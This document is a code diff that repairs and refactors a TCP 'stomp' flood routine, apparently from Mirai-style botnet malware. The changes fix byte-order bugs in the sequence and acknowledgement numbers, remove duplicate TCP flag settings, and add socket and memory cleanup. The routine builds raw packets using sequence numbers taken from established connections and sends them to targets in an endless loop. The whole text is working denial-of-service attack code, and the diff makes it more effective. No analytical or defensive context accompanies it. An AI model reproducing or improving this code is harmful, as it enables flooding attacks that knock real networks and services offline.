@@ -783,20 +852,18 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                         iph->saddr = LOCAL_ADDR;
                         iph->daddr = stomp_data[i].addr;
 
-                        tcph->source = stomp_data[i].sport;
-                        tcph->dest = stomp_data[i].dport;
-                        tcph->seq = stomp_data[i].ack_seq;
-                        tcph->ack_seq = stomp_data[i].seq;
-                        tcph->doff = 8;
-                        tcph->fin = TRUE;
-                        tcph->ack = TRUE;
-                        tcph->window = rand_next() & 0xffff;
-                        tcph->urg = urg_fl;
-                        tcph->ack = ack_fl;
-                        tcph->psh = psh_fl;
-                        tcph->rst = rst_fl;
-                        tcph->syn = syn_fl;
-                        tcph->fin = fin_fl;
+                        tcph_pkt->source = stomp_data[i].sport;
+                        tcph_pkt->dest = stomp_data[i].dport;
+                        tcph_pkt->seq = htonl(stomp_data[i].ack_seq);
+                        tcph_pkt->ack_seq = htonl(stomp_data[i].seq);
+                        tcph_pkt->doff = 8;
+                        tcph_pkt->fin = fin_fl;
+                        tcph_pkt->ack = ack_fl;
+                        tcph_pkt->window = htons(rand_next() & 0xffff);
+                        tcph_pkt->urg = urg_fl;
+                        tcph_pkt->psh = psh_fl;
+                        tcph_pkt->rst = rst_fl;
+                        tcph_pkt->syn = syn_fl;
 
                         rand_str(payload, data_len);
                         break;
@@ -818,38 +885,46 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                 goto stomp_setup_nums;
             }
         }
+        
+        close(fd);
     }
 
-    
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             char *data = (char *)(tcph + 1);
 
             if (ip_ident == 0xffff)
-                iph->id = rand_next() & 0xffff;
+                iph->id = htons(rand_next() & 0xffff);
 
             if (data_rand)
                 rand_str(data, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
-            tcph->seq = htons(stomp_data[i].seq++);
-            tcph->ack_seq = htons(stomp_data[i].ack_seq);
+            tcph->seq = htonl(stomp_data[i].seq++);
+            tcph->ack_seq = htonl(stomp_data[i].ack_seq);
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
 
             targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, 
+                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
+
+cleanup_and_return:
+    if (stomp_data) free(stomp_data);
+    cleanup_tcp_attack(pkts, targs_len, rfd);
 }
